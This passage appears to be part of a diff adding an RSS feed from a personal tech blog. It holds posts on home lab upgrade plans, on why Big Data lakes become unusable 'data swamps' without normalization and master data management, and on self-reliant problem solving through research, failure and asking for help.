+<h1 id="whats-next-for-my-home-lab">What&rsquo;s next for my home lab?</h1>
+<p>As you&rsquo;ve probably guessed, the possibilities here are somewhat endless, but here&rsquo;s a high level overview of what I&rsquo;m looking to do with over the next couple of months/years:</p>
+<ul>
+<li>Hardware
+<ul>
+<li>Update my router with a more powerful configuration (e.g. Unifi devices)</li>
+<li>Replace my NAS with something more modern (e.g. Synology 4 or 5 bay NAS)</li>
+</ul>
+</li>
+<li>Software/Use cases
+<ul>
+<li>RTSP server for home security cameras</li>
+<li>Replace various VMs with Docker containers to both free up resources and to gain further experience working with Docker</li>
+<li>Further automation with Ansible to cover as many software configurations as possible</li>
+</ul>
+</li>
+</ul>
+<h1 id="where-can-i-learn-more">Where can I learn more?</h1>
+<ul>
+<li><a href="https://www.reddit.com/r/homelab/">https://www.reddit.com/r/homelab/</a></li>
+<li><a href="https://www.reddit.com/r/HomeNetworking/">https://www.reddit.com/r/HomeNetworking/</a></li>
+</ul>
+]]></content></item><item><title>Draining the (Big Data) Swamp</title><link>https://maclarel.github.io/posts/2018-07/draining-the-big-data-swamp/</link><pubDate>Tue, 24 Jul 2018 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2018-07/draining-the-big-data-swamp/</guid><description>Before we dive too far into this article, let&amp;rsquo;s define a few key terms that will come up at several points:
+Big Data - Technology relating to the storage, management, and utilization of &amp;ldquo;Big Data&amp;rdquo; (e.g. enormous amounts of data/petabyte scale). Data Lake - A common term to refer to a storage platform for Big Data. In this case, let&amp;rsquo;s assume Apache Hadoop (HDFS) or Amazon S3. Data Warehouse - A large store of data sourced from a variety of sources within a company, then used to guide management or business decisions.</description><content type="html"><![CDATA[<p>Before we dive too far into this article, let&rsquo;s define a few key terms that will come up at several points:</p>
+<ul>
+<li><code>Big Data</code> - Technology relating to the storage, management, and utilization of &ldquo;Big Data&rdquo; (e.g. enormous amounts of data/petabyte scale).</li>
+<li><code>Data Lake</code> - A common term to refer to a storage platform for Big Data. In this case, let&rsquo;s assume Apache Hadoop (HDFS) or Amazon S3.</li>
+<li><code>Data Warehouse</code> - A large store of data sourced from a variety of sources within a company, then used to guide management or business decisions.</li>
+<li><code>ETL</code> - Extract, Transform, Load. The process of taking data from one source, making changes to it, and loading it into another location. The underpinning of Master Data Management, and basically all data movement.</li>
+<li><code>Master Data Management (MDM)</code> - The concept of merging important data into a single point of reference. For a lot of Big Data applications, this means tying data back to a single person or actor.</li>
+</ul>
+<h1 id="now-with-that-out-of-the-way-why-on-earth-is-the-name-of-this-article-talking-about-a-data-swamp">Now with that out of the way&hellip; why on earth is the name of this article talking about a Data Swamp?</h1>
+<p>Coming from the RDBMS/data warehouse world - data normalization and MDM is a critical part of any project involving data. Generally there will be some source system that is feeding data in that is then &ldquo;cleaned&rdquo; (or normalized) to reduce duplication/inconsistencies and is then fed into a data warehouse which is used for reporting.</p>
+<p>Let&rsquo;s say that you&rsquo;re handling data coming in from two ubiquitous Microsoft platforms - Active Directory and Exchange. Both of these have relatively consistent logging formats to track access, or at least to track behaviour, but where things get different quickly is who they say is accessing things.</p>
+<p>With Active Directory logs (let&rsquo;s just say evtx format for the sake of argument), you&rsquo;ll see the account name as <code>DOMAIN\User</code>, or in some cases <code>user@domain.com</code>. With Exchange, however, you&rsquo;re going to see data coming in under the user&rsquo;s email address or, if there&rsquo;s no authentication configured, whatever email address was specified as the sender&hellip; in some cases this is going to be <code>user@domain.com</code> however frequently it can also be <code>firstname.lastname@domain.com</code> or any other infinite number of ways that an organization chooses to reference email addresses.</p>
+<p>To put this into a more real world example, at a company I used to work with my login for the domain was in the format of a country code and employee ID, e.g. <code>CA123456</code>, so AD would track me under that ID and only that ID. At that same company I had two email addresses - <code>tdn@company.com</code>, and <code>thedatanewbie@company.com</code> (short name and long name). See where this gets confusing!?</p>
+<h1 id="ok-now-i-understand-that-data-is-a-mess-whats-your-point">OK, now I understand that data is a mess&hellip; What&rsquo;s your point?</h1>
+<p>Now picture yourself on the receiving end of those logs and trying to piece this all together into a working scenario where you can say that I logged in at 8AM at my normal office place and send out fifteen emails to thirty recipients&hellip; That&rsquo;s where MDM comes into play!</p>
+<p>Despite the seemingly strange approach, there&rsquo;s usually a method to the madness in this sort of thing. Generally all of these items are referenced together in some place&hellip; generally an Active Directory user profile or some LDAP based equivalent. Easy to use, right!? Maybe&hellip;</p>
+<p>Attributes in an LDAP profile can be public, meaning anyone who can do a lookup on the user can see them, or they can be private which means that you have to be authorized to see them. In a lot of cases the public attributes are only going to be group memberships, a real name, and the user name - this leaves a lot out to dry.</p>
+<p>Let&rsquo;s assume, though, that we have privileged access and can now read all the attributes - we&rsquo;ve got our source of truth! Fantastic! Let&rsquo;s ignore the logistics of trying to maintain up to date LDAP lookups on demand for tens of thousands of users, let alone hundreds of thousands, and move on&hellip;</p>
+<p>At this point a consulting team that gets paid lots of money is going to implement some sort of ETL pipeline that pulls data from the source system, does enrichment to tie this all to the &ldquo;one true version&rdquo; of a user, and then loads it into the Data Warehouse which will be used for reporting.</p>
+<h1 id="this-all-sounds-great-weve-identified-how-to-enrich-the-data-ignoring-the-logistics-of-doing-so-and-now-youve-got-a-data-warehouse-you-can-report-off-of">This all sounds great! We&rsquo;ve identified how to enrich the data (ignoring the logistics of doing so), and now you&rsquo;ve got a Data Warehouse you can report off of!</h1>
+<p>Absolutely, it is great, but here is where we get back to the title of this article! Everything I just described is extremely common in the relational database world (e.g. Oracle, MS SQL Server, etc&hellip;) for reporting with products like Cognos, Qlik, etc&hellip; but unfortunately it is a concept that seems to be routinely ignored in the Big Data world.</p>
+<p>As noted earlier, a lot of people will take these logs from many places and store them in their Data Lake for future use/analysis/etc&hellip; While it&rsquo;s great that they get stored, what this means is that you&rsquo;ve got likely petabytes worth of data that you&rsquo;re paying to store but are not using for anything and could not effectively use for anything that would not be extremely resource intensive to implement.</p>
+<h1 id="this-is-why-big-data-implementations-fail">This is why Big Data implementations fail!</h1>
+<p>Big Data is expensive, and its complex&hellip; it&rsquo;s the perfect storm of hard to do! With this said, all of the same concepts we talked about earlier still apply, they just have to be done differently! Running data through an ETL tool designed for an RDBMS that maybe operates on a total of 24 CPU cores and 128GB of RAM isn&rsquo;t going to cut it when you&rsquo;re dealing with enterprise levels of log files.</p>
+<p>This is where I say it&rsquo;s expensive - not only do you need to have the expertise and knowledge of which tooling to use and how to use it, you need be willing to pay to make it happen. In a lot of cases for an enterprise handling authentication logs, email logs, endpoint logs, firewall logs, etc&hellip; this is going to be manifesting its self in the many dozens of CPU cores and hundreds of gigabytes of memory just to do the normalization. You can quickly see why there&rsquo;s hesitation to do this - who wants to spend upwards of half a million dollars on something that&rsquo;s just changing a user name in a log file!?</p>
+<p>Unfortunately, without spending that money, those logs that are sitting in S3 (despite it being really cheap) are not really going to be useful if you want to use them down the road. This is where you wind up with the eponymous Data Swamp - a very murky lake full of data.</p>
+<p>Many Data Lakes get set up as part of security initiatives so that there can be a postmortem on a breach, or even used proactively in the world of UEBA and Security Analytics, but without this MDM work (and in many cases even basic normalization) that company is going to wind up with the following challenges, to name a few:
+Weeks or months of time spent identifying the characteristics and &ldquo;shapes&rdquo; of the data that is stored in the data lake.
+The same cost that would have been incurred originally to now perform that MDM work (but under a time crunch).
+Added costs and stress of trying to expedite an implementation of something to analyze the logs, or to have their security team(s) manually review them in a SIEM style tool like Splunk.
+Really, it just circles back to what could have been done in the first place, and what would have allowed that company to have proactive tools in place, but even past that do immediate manual analysis or rules-based analysis of the data that was stored without having to incur all of the additional costs, stress, and time taken to do so after the fact.</p>
+<h1 id="youre-painting-a-pretty-dire-picture-are-all-big-data-implementations-like-this">You&rsquo;re painting a pretty dire picture&hellip; Are all Big Data implementations like this?</h1>
+<p>NO! Thank goodness they are not, but the ones that fail all seem to have the same characteristics.</p>
+<ul>
+<li>No willingness to spend (usually this turns into all of this data living in S3 because it&rsquo;s cheap).</li>
+<li>Limited forethought into the end use case (e.g. SIEM, Security Analytics, etc&hellip;).</li>
+<li>No dedicated team for the platform, and thus no one to enable the end use case.</li>
+</ul>
+<p>The ones that are successful, however, tend to have done the following:</p>
+<ul>
+<li>Brought in, or hired, the expertise to handle the data movement and transformation, and continue to engage with those teams if they are not permanent.</li>
+<li>Implement(ed) the Data Lake with a specific goal in mind, and identified the work required to make that happen.</li>
+<li>Engaged with, or at least consulted, vendors that would enable the use case once the data was available.</li>
+</ul>
+<h1 id="lets-wrap-this-up">Let&rsquo;s wrap this up.</h1>
+<p>Is this technically easy? Absolutely not. It&rsquo;s not easy even in the RDBMS world where a few dozen gigabytes of sales data across 500 retails stores is considered a huge volume of data to report off of. What I&rsquo;m saying at the end of this is that conceptually it&rsquo;s something that seems to get missed in a lot of Big Data implementations, and there are a lot of folks out there who have been blasting Big Data/Hadoop implementations for years despite the fact that a lot of those issues can be tied back to this at the end of the day.</p>
+<p>If this struck a chord with you, and it&rsquo;s something you&rsquo;re having trouble with, keep an eye on this blog and the associated YouTube channel. We&rsquo;re going to be taking a look at a bunch of technology that enables this whole thing to work - Kafka, NiFi, Elasticsearch, Hadoop, etc&hellip; there&rsquo;s no shortage of platforms to let you do this work, and even choosing the &ldquo;wrong&rdquo; one generally won&rsquo;t hamstring you too much, but you have to make that leap to get started!</p>
+]]></content></item><item><title>Being Self-Reliant with Technology</title><link>https://maclarel.github.io/posts/2018-04/self-reliant/</link><pubDate>Fri, 20 Apr 2018 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2018-04/self-reliant/</guid><description>Let&amp;rsquo;s talk about &amp;ldquo;self-reliance&amp;rdquo; as it relates to career and learning. The three aspects of this we&amp;rsquo;re going to discuss are:
+Research Failure Asking for Help Research You&amp;rsquo;re sitting at your desk, and you&amp;rsquo;ve got a piece of code that isn&amp;rsquo;t working, or some other challenge&amp;hellip; it&amp;rsquo;s not even technical! You&amp;rsquo;re stuck and you&amp;rsquo;ve run out of ideas, so you need to turn somewhere else for answers.
+The first instinct of many people in this situation is to simply ask someone else, but I virtually guarantee that others have already done that, and you can likely find your answer on Google!</description><content type="html"><![CDATA[<p>Let&rsquo;s talk about &ldquo;self-reliance&rdquo; as it relates to career and learning. The three aspects of this we&rsquo;re going to discuss are:</p>
+<ul>
+<li>Research</li>
+<li>Failure</li>
+<li>Asking for Help</li>
+</ul>
+<h1 id="research">Research</h1>
+<p>You&rsquo;re sitting at your desk, and you&rsquo;ve got a piece of code that isn&rsquo;t working, or some other challenge&hellip; it&rsquo;s not even technical! You&rsquo;re stuck and you&rsquo;ve run out of ideas, so you need to turn somewhere else for answers.</p>
+<p>The first instinct of many people in this situation is to simply ask someone else, but I virtually guarantee that others have already done that, and you can likely find your answer on Google! Obvious, right!?</p>
+<p>The problem many people encounter when turning to Google (or any form of research like this) is that they will try to be too specific in what they are looking for, and a lot of the time it will result in little to nothing being found. What you can do, instead, is search for variations of your issue - for example, take parts of an error message or the error code so that you can get a broad understanding of what you could be looking at.</p>
+<p>For tech purposes, Stack Overflow is a common resource that people will turn to directly, or which will come up in searches. Very frequently, you&rsquo;ll find an answer to your question on Stack Overflow, but it may not be the answer. By this I mean that the solution you find may work, but it may not be the most efficient way to address the problem.</p>
+<p>The goal of your research should not only be to find an answer, but to learn from the plethora of information you find so that you can determine the best approach forward.</p>
+<h1 id="failure">Failure</h1>
+<p>Next up, we&rsquo;re going to about failure.</p>
+<p>Isn&rsquo;t this what got us here to start!? Yes, but it&rsquo;s also the best way to learn!</p>
+<p>Continuing with the example of some broken code - you&rsquo;ve now done some research, found ten or twenty different ways to code around the problem, and now you need to implement those and find out:</p>
+<ul>
+<li>Do they work?</li>
+<li>Which is the best for your purposes?</li>
+<li>What can you change to make it work even better?</li>
+</ul>
+<p>It may seem intuitive that you want to test your code before using it in the real world, but this meme exists for a reason:</p>
+<p><img src="https://msdnshared.blob.core.windows.net/media/MSDNBlogsFS/prod.evol.blogs.msdn.com/CommunityServer.Blogs.Components.WeblogFiles/00/00/01/32/02/metablogapi/8054.image_thumb_35C6E986.png" alt="test in production"></p>
+<p>Work in your local (or cloud based) development environment, break things until you find what works best!</p>
+<h1 id="asking-for-help">Asking for Help</h1>
+<p>We&rsquo;ve done research, and now we&rsquo;ve tried, and failed, to solve the problem. On the plus side, we&rsquo;ve learned a ton about the situation and some ways to address and avoid similar problems in the future, but are still stuck&hellip; it&rsquo;s time to ask for help!</p>
+<p>Yes, you could have started out with this, but the reason it&rsquo;s the last step is that the goal here isn&rsquo;t only to solve a problem - it&rsquo;s to learn from solving it. The great part about having done your research, and having tried things, is that you&rsquo;ve not only saved yourself time in the future but you&rsquo;re going to save time for the person you&rsquo;re going to be asking as well.</p>
+<p>The first questions that you will get almost every time when asking for help are &ldquo;What&rsquo;s the issue, and what have you tried?&rdquo;.</p>
+<p>By having tried many things and researched before involving someone else and using their time, you can answer this with an educated statement around what has not worked, what may have gotten you part of the way toward an answer, and what you think might be the path forward.</p>
+<p>Chances are that the person you&rsquo;re asking for help already is going to follow, or already has in their past experience, the exact same steps here. It&rsquo;s due to this experience, that you&rsquo;re now trying to build, that you&rsquo;ll be able to work together to get a quick and good solution.</p>
+<h1 id="wrap-up">Wrap-up</h1>
+<p>I know this all seems like it&rsquo;s common sense, but you&rsquo;d be surprised at how many people skip this process and just jump to asking other people - especially skipping the &ldquo;Failure&rdquo; after not finding an exact answer after some preliminary research. At the end of the day, yes, getting your solution was slower than just asking, but think of all of the time that you&rsquo;ve now saved yourself in the future, as well as the time that would have been working through these same steps with someone else.</p>
+]]></content></item></channel></rss>
